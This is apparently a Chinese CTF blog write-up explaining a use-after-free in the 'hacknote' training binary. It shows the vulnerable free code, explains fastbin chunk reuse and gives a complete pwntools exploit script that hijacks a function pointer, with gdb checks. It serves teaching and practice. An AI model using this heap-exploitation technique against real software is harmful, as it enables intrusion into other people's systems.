---
title: UAF
tags: [ctf-pwn,exp]
date: 2022-11-22 20:37:00
categories: [ctf-pwn]
excerpt: User After Free in Heap Exploitation
---

#### 参考ctf-wiki

<https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/use_after_free/hitcon-training-hacknote>

以下实验所用程序（与源码）见上述链接中文件hacknote（与hacknote.c）

#### 漏洞的发现

在`del_note()`函数中free掉指针之后没有清零：

```C
void del_note() {
  char buf[4];
  int idx;
  printf("Index :");
  read(0, buf, 4);
  idx = atoi(buf);
  if (idx < 0 || idx >= count) {
    puts("Out of bound!");
    _exit(0);
  }
  if (notelist[idx]) {
    free(notelist[idx]->content);
    free(notelist[idx]);
    puts("Success");
  }
}
// 并且在add_note中是根据notelist[i]是否为nullptr判断在哪个位置add新note
```

程序中给了system：

````C
int magic()
{
  return system("cat flag");
}
````

#### 漏洞利用方法

exp如下

```python
add(0x20, 'aaaa\n')
add(0x20, 'bbbb\n')
delete(0)
delete(1)
add(0x8, p32(magic))
show(0)
```

下面介绍这个exp的原理

在delete 0和1之后fastbin结构如下图

<div class="mxgraph" style="max-width:100%;border:1px solid transparent;" data-mxgraph="{&quot;highlight&quot;:&quot;#0000ff&quot;,&quot;nav&quot;:true,&quot;resize&quot;:true,&quot;xml&quot;:&quot;&lt;mxfile host=\&quot;app.diagrams.net\&quot; modified=\&quot;2022-11-22T16:47:04.851Z\&quot; agent=\&quot;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\&quot; etag=\&quot;xMjKslWb0NtHo6yfLEq6\&quot; version=\&quot;20.5.3\&quot; type=\&quot;device\&quot;&gt;&lt;diagram id=\&quot;wU8d93oxY3eO_jrvUp61\&quot; name=\&quot;第 1 页\&quot;&gt;7VlZj9sgEP4tfbDUPqRyfOR43CTbXamt1GrVdts3YmMbBYOLydVfXzDgM8c2qyZZaV9imBkG+Ga+ATuWO003dwxkyWcaQmw5drix3JnlOP3h2BYPKdkqycjVgpihUBtVggf0B2qhMVuiEOYNQ04p5ihrCgNKCAx4QwYYo+umWURxc9YMxLAjeAgA7kp/oJAnehfOsJLfQxQnZub+YKw0KTDGeid5AkK6roncW8udMkq5aqWbKcQSPIOLGvdhj7ZcGIOEP2XA6uun4bfsz+BxDqPo4+Ps1/dl2hsoLyuAl3rD1tSxJkP96wxAmlnuhMxz+bDkFNcoqq/56b+XX/du0Wm7ORGDIjX51uQ7o0sSQpkytljNOkEcPmQgkNq1YLiQJTzFotcXzYgSrinrjIrFt1NSZ+kKMg43NZFO0TtIU8jZVpgYraGLrheur/vrin2+qSFJjXkDLQOa8HHpuuKEaGha/ANFhl2KOAMsZp3kGSAN9Aa/l5LNk4Biyiz3RihZPH8rViamts3jnQqzBK8XgRThrTK9h3gFOQpATZ8X6EqtM8o2dYWaVGoIZSnANd0KMATEE6MY8CWT5fOgXQCyfSZrjbBUeratNBhyDllPbD9AJO6OpCxLANEuHSUT4ec9IFZElDgQKQJZTYdE2hE9k222Wmg4E84i4d/MRKDSipQo6nttmjVlYXNhpS+xl/kCCXfSZ84ZXcCeTqqG3RwEi7igQa8VR8cbqRA63lg3fBPNwmsIA8oAR5T0eIKCBYG5Xh4iiCODT9u2FsuDdrXlNOwiTAFvgxOiPMNga8wxEgrHfoPSjDIOJNKTKmFFK5bPCORcQoBE9HSSC86oPFcWnYIhF3neSnGgMvS9c1aG0Y7KcG3l1D9eTsuSexbQxtcPmju4NtDMbfgQapCEN/LCK3oBBnmOgiZQTVTbsMEN4o9S997XvZ96nGzPNnpY0dnqzl6oc7pkATzOHBg2Lt/dgNQP/R14GxmDWFTIVfPKvisIeoYvFBFexdv3mvH2/FYc1X70qPoVu+WofGsxjoYtRxywGPKOoyInym0/I02cTpoEyZIshGhq6vmcmVJub0bdcn5p7rULVgnh5bjnvSjuXQmn2lQo7+zP5ZQ/PjOn/L2cunmhnCohvByndnx3eOXUMU55rXdjr38ipzqOzn1Odd+pDadmuzjl2NdHqvYl8QoOqie8j7yS6hgXTj6oOo7OfVB136wMqSYvlVT/86QS3erjuwpC9ReGe/sX&lt;/diagram&gt;&lt;/mxfile&gt;&quot;,&quot;toolbar&quot;:&quot;pages zoom layers lightbox&quot;,&quot;page&quot;:0}"></div>
<script type="text/javascript" src="https://app.diagrams.net/js/viewer-static.min.js"></script>

chunk A是申请的`note[0]`结构体的空间，chunk B是`note[0]->content`的空间

chunk C、D是`note[1]`的空间

由于fastbin会把同样大小的块放在同一个链表上，因此两个0x8大小的chunk A、 chunk C会被连在一起，并且由于fastbin使用的是先进后出的单向链表，A在C下面。

当申请一个content大小为0x8的新的note时，会将A和C从fastbin中取出。先malloc结构体本身，使用chunk C，然后malloc content，使用chunk A。

因此`add(0x8,p32(magic))`会把magic地址写入content，调用show的时候，会直接执行这个函数。

理论是如此，下面用gdb验证一下

#### 调试

完整exp，在两次add、两次delete、最后一次add之后分别attach查看notelist

```python
from pwn import *
r = process(file_name)
elf = ELF('./hacknote')
menu = 'Your choice :'

def add(size, content):
    r.sendlineafter(menu, '1')
    r.sendlineafter('Note size :', str(size))
    r.sendafter('Content :', content)

def delete(index):
    r.sendlineafter(menu, '2')
    r.sendlineafter('Index :', str(index))

def show(index):
    r.sendlineafter(menu, '3')
    r.sendlineafter('Index :', str(index))

def dbg():
    gdb.attach(r)

add(0x20, 'aaaa\n')
add(0x20, 'bbbb\n')
dbg()
delete(0)
delete(1)
dbg()
magic = 0x08048986
add(0x8, p32(magic))
dbg()
show(0)
r.interactive()
```

在ida中可以看到notelist的地址

```assembly
.bss:0804A070 ; void *notelist
.bss:0804A070 notelist        dd ?                    ; DATA XREF: add_note+40↑r
.bss:0804A070                                         ; add_note+61↑w ...
.bss:0804A074                 db    ? ;
```

查看三次notelist的内容，

![](/img/UAF/1.jpg)

![](/img/UAF/2.jpg)

![](/img/UAF/3.jpg)

可以看到，`0x92f31a0`上的地址为print_note函数的地址，在free之前，`0x92f31a4`上的内容指向下一行开头，即`aaaa`字符串，所以这里就是note[0]。

在第三次add之后改变了note[0]原本在print_note上的函数指针，因此show(0)时会执行magic

